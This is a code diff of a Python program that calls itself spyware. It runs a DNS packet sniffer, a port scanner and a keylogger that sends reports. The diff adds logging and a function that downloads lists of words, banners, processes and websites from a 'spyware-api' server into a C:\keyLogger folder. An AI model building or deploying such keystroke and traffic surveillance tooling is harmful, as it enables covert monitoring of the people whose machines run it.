@@ -138,6 +138,7 @@ class Sniffer(threading.Thread):
                     sendAlert(log)
 
     def run(self):
+        logging("Iniciou do sniffer!")
         sniff(filter='udp port 53', store=0, prn=self.sniffer)
 
 class Keylogger:
@@ -213,6 +214,7 @@ class Scanner(threading.Thread):
             pass
 
     def run(self):
+        logging("Iniciou o Scanner!")
         for port in range(1, 5051):
             while threading.active_count() > 150:
                 time.sleep(0.01)
@@ -227,12 +229,38 @@ class Scanner(threading.Thread):
                     sendAlert(self.log)
     logging("Terminou o Scanner")
 
+def updateAuxData():
+    headers = doLogin()
+    logging("Iniciou a atualização dos dados auxiliars!")
+    try:
+        badLanguages = requests.get("https://spyware-api.herokuapp.com/badLanguage/getAll", headers=headers).json()
+        with open(r"C:\keyLogger\badLanguage.txt", "w") as file:
+            for badLanguage in badLanguages:
+                file.write(badLanguage.get('word') + ";")
+
+        ports = requests.get("https://spyware-api.herokuapp.com/port/getAll", headers=headers).json()
+        with open(r"C:\keyLogger\vulnarable_banners.txt", "w") as file:
+            for port in ports:
+                file.write(port.get('vulnarableBanners') + ";")
+
+        processes = requests.get("https://spyware-api.herokuapp.com/process/getAll", headers=headers).json()
+        with open(r"C:\keyLogger\maliciousProcess.txt", "w") as file:
+            for process in processes:
+                file.write(process.get('nameExe') + ";")
+
+        websites = requests.get("https://spyware-api.herokuapp.com/website/getAll", headers=headers).json()
+        with open(r"C:\keyLogger\sites.txt", "w") as file:
+            for website in websites:
+                file.write(website.get('url') + ";")
+    except Exception as ex:
+        logging("Error to update the auxiliar data." + str(ex))
+
+
 
 if __name__ == "__main__":
     logging("Iniciou do programa!")
-    logging("Iniciou o Scanner!")
+    updateAuxData()
     Scanner().start()
-    logging("Iniciou do sniffer!")
     Sniffer().start()
     logging("Iniciou do KeyLogger!")
     keylogger = Keylogger(interval=SEND_REPORT_EVERY)
